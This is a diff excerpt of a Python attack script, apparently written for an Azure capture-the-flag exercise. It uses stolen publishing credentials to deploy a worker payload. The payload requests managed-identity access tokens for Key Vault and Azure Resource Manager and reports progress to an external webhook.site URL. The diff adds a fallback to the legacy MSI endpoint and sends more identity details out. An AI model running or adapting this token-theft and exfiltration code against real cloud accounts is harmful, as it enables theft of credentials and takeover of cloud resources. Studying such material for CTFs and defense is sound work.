@@ -60,8 +60,9 @@ kp = pub["properties"]["publishingPassword"]
 auth = base64.b64encode((ku + ":" + kp).encode()).decode()
 
 worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
-IE = os.environ.get("IDENTITY_ENDPOINT", "")
-IH = os.environ.get("IDENTITY_HEADER", "")
+IE = os.environ.get("IDENTITY_ENDPOINT") or os.environ.get("MSI_ENDPOINT") or "http://127.0.0.1:8081/msi/token"
+IH = os.environ.get("IDENTITY_HEADER") or os.environ.get("MSI_SECRET", "")
+LEGACY = bool(os.environ.get("MSI_ENDPOINT")) and not os.environ.get("IDENTITY_ENDPOINT")
 MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
 HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
 OUT = "/home/site/wwwroot/ctf_flag_result"
@@ -78,13 +79,14 @@ def save(obj):
         pass
 def token(resource):
     q = IE + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01&mi_res_id=" + urllib.parse.quote(MIRES)
-    req = urllib.request.Request(q, headers={"X-IDENTITY-HEADER": IH})
+    headers = ({"Secret": IH} if LEGACY else {"X-IDENTITY-HEADER": IH})
+    req = urllib.request.Request(q, headers=headers)
     return json.loads(urllib.request.urlopen(req, timeout=25).read().decode())["access_token"]
 def oid(jwt):
     p = jwt.split(".")[1]
     p += "=" * (-len(p) % 4)
     return json.loads(base64.urlsafe_b64decode(p)).get("oid")
-emit({"stage":"worker-started","ts":time.time()})
+emit({"stage":"worker-started","ts":time.time(),"identity_endpoint":IE,"legacy":LEGACY,"has_header":bool(IH)})
 try:
     vt = token("https://vault.azure.net")
     at = token("https://management.azure.com")
